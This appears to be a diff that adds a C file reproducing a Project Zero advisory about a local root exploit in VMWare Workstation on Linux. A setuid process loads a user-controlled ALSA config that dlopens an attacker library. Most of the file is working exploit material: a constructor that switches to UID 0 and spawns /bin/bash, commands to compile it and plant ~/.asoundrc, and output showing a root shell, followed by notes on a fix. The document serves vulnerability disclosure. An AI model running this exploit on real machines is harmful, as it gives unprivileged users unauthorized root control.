@@ -1,0 +1,81 @@
+/*
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1142
+
+This vulnerability permits an unprivileged user on a Linux machine on
+which VMWare Workstation is installed to gain root privileges.
+
+The issue is that, for VMs with audio, the privileged VM host
+process loads libasound, which parses ALSA configuration files,
+including one at ~/.asoundrc. libasound is not designed to run in a
+setuid context and deliberately permits loading arbitrary shared
+libraries via dlopen().
+
+To reproduce, run the following commands on a normal Ubuntu desktop
+machine with VMWare Workstation installed:
+
+
+~$ cd /tmp
+/tmp$ cat > evil_vmware_lib.c
+*/
+
+#define _GNU_SOURCE
+#include <stdlib.h>
+#include <string.h>
+#include <stdio.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <sys/prctl.h>
+#include <err.h>
+
+extern char *program_invocation_short_name;
+
+__attribute__((constructor)) void run(void) {
+	if (strcmp(program_invocation_short_name, "vmware-vmx"))
+		return;
+
+	uid_t ruid, euid, suid;
+	if (getresuid(&ruid, &euid, &suid))
+		err(1, "getresuid");
+	printf("current UIDs: %d %d %d\n", ruid, euid, suid);
+	if (ruid == 0 || euid == 0 || suid == 0) {
+		if (setresuid(0, 0, 0) || setresgid(0, 0, 0))
+			err(1, "setresxid");
+		printf("switched to root UID and GID");
+		system("/bin/bash");
+		_exit(0);
+	}
+}
+
+/*
+/tmp$ gcc -shared -o evil_vmware_lib.so evil_vmware_lib.c -fPIC -Wall -ldl -std=gnu99
+/tmp$ cat > ~/.asoundrc
+hook_func.pulse_load_if_running {
+        lib "/tmp/evil_vmware_lib.so"
+        func "conf_pulse_hook_load_if_running"
+}
+/tmp$ vmware
+
+
+Next, in the VMWare Workstation UI, open a VM with a virtual sound
+card and start it. Now, in the terminal, a root shell will appear:
+
+
+/tmp$ vmware
+current UIDs: 1000 1000 0
+bash: cannot set terminal process group (13205): Inappropriate ioctl for device
+bash: no job control in this shell
+~/vmware/Debian 8.x 64-bit# id
+uid=0(root) gid=0(root) groups=0(root),[...]
+~/vmware/Debian 8.x 64-bit# 
+
+
+I believe that the ideal way to fix this would be to run all code that
+doesn't require elevated privileges - like the code for sound card
+emulation - in an unprivileged process. However, for now, moving only
+the audio output handling into an unprivileged process might also do
+the job; I haven't yet checked whether there are more libraries VMWare
+Workstation loads that permit loading arbitrary libraries into the
+vmware-vmx process.
+
+Tested with version: 12.5.2 build-4638234, running on Ubuntu 14.04.
+*/
